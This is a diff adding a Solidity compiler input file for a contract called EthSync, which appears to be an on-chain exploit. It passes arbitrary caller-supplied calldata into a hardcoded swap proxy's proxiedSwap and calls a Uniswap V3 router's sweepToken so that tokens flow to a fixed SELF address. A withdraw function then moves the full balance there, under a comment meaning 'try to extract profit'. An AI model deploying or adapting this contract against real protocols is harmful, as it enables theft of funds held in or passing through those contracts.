@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/EthSync.sol": {
+      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.0;\ninterface IERC20 {\n    function transfer(address to, uint256 value) external returns (bool);\n    function balanceOf(address owner) external view returns (uint);\n}\n\ninterface IZeroProxy {\n    function proxiedSwap(\n        bytes calldata msgData, \n        address feeToken, \n        address inputToken, \n        uint256 inputAmount, \n        address outputToken, \n        uint256 fee\n    ) external payable returns (bytes memory);\n}\n\ninterface IUniv3 {\n    function sweepToken(\n        address token,\n        uint256 amountMinimum,\n        address recipient\n    ) external payable;\n}\n\ncontract EthSync {\n    IZeroProxy zeroProxy = IZeroProxy(0xe66B31678d6C16E9ebf358268a790B763C133750); \n    IUniv3 univ3 = IUniv3(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    address public _ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n    address public SELF = 0xccbab8754658276244646061B527Aa583C4Ed320;\n\n   function withdraw(address token) public {\n        // 尝试提取收益\n        uint balance = IERC20(token).balanceOf(address(this));\n        IERC20(token).transfer(SELF, balance);\n    }\n\n    function doZ(bytes calldata msgData, address token) public {\n        zeroProxy.proxiedSwap{value: 0}(msgData, _ETH_ADDRESS, _ETH_ADDRESS, 0, token, 0);\n    }\n\n    function doU(address token) public {\n        univ3.sweepToken(token, 1, SELF);\n    }\n}"
+    }
+  }
+}
